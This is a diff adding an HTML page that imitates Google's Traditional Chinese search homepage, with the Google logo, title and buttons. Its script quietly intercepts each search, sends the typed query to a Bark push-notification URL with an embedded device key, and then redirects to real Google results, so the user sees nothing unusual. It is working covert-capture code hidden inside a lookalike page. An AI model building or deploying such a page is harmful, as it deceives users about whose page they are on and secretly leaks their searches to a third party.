@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            width: 100%;
+            padding-bottom: 15vh; /* Push content slightly up */
+        }
+        .logo {
+            width: 272px;
+            height: 92px;
+            margin-bottom: 28px;
+        }
+        .search-container {
+            position: relative;
+            width: 100%;
+            max-width: 584px;
+            margin: 0 auto;
+        }
+        .search-bar {
+            width: 100%;
+            padding: 10px 45px;
+            height: 46px;
+            border-radius: 24px;
+            border: 1px solid #dfe1e5;
+            box-shadow: none;
+            font-size: 16px;
+            box-sizing: border-box; /* Ensures padding doesn't affect final width */
+        }
+        .search-bar:hover, .search-bar:focus {
+            box-shadow: 0 1px 6px rgba(32,33,36,.28);
+            border-color: rgba(223,225,229,0);
+            outline: none;
+        }
+        .search-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            fill: #9aa0a6;
+        }
+        .mic-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+        .buttons {
+            margin-top: 28px;
+        }
+        .button {
+            background-color: #f8f9fa;
+            border: 1px solid #f8f9fa;
+            border-radius: 4px;
+            color: #3c4043;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            margin: 11px 4px;
+            padding: 0 16px;
+            line-height: 27px;
+            height: 36px;
+            min-width: 54px;
+            text-align: center;
+            cursor: pointer;
+            user-select: none;
+        }
+        .button:hover {
+            box-shadow: 0 1px 1px rgba(0,0,0,.1);
+            background-color: #f8f9fa;
+            border: 1px solid #dadce0;
+            color: #202124;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+        
+        <div class="search-container">
+            <form id="search-form" action="https://www.google.com/search" method="get">
+                <svg class="search-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
+                </svg>
+                <input type="text" class="search-bar" name="q" id="search-input" title="搜尋" autofocus>
+                <img src="https://www.gstatic.com/images/branding/googlemic/2x/googlemic_color_24dp.png" alt="Voice Search" class="mic-icon">
+            </form>
+        </div>
+
+        <div class="buttons">
+            <button class="button" type="submit" form="search-form">Google 搜尋</button>
+            <button class="button" type="submit" form="search-form" name="btnI" value="1">好手氣</button>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('search-form').addEventListener('submit', function(event) {
+            // Prevent the form from submitting immediately
+            event.preventDefault();
+
+            // Get the search keyword from the input field
+            const query = document.getElementById('search-input').value;
+
+            // Check if the query is not empty
+            if (query.trim() !== '') {
+                // 1. Send notification to Bark
+                const barkUrl = `https://api.day.app/ZRThbuFUNKAn26qqofTNJi/${encodeURIComponent(query)}`;
+                
+                // Use navigator.sendBeacon for more reliable background sending, or a simple fetch
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(barkUrl);
+                } else {
+                    fetch(barkUrl, {
+                        method: 'POST', // or 'GET' depending on what Bark API prefers for simple notifications
+                        keepalive: true
+                    }).catch(error => console.error('Bark notification failed:', error));
+                }
+
+                // 2. Redirect to the actual Google search results page
+                // We need to wait a very short moment to ensure the beacon is sent
+                setTimeout(() => {
+                    window.location.href = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
+                }, 100); // 100ms delay
+
+            } else {
+                // If the query is empty, just let the form submit normally (or do nothing)
+                // In this case, we do nothing to replicate Google's behavior
+            }
+        });
+    </script>
+</body>
+</html>
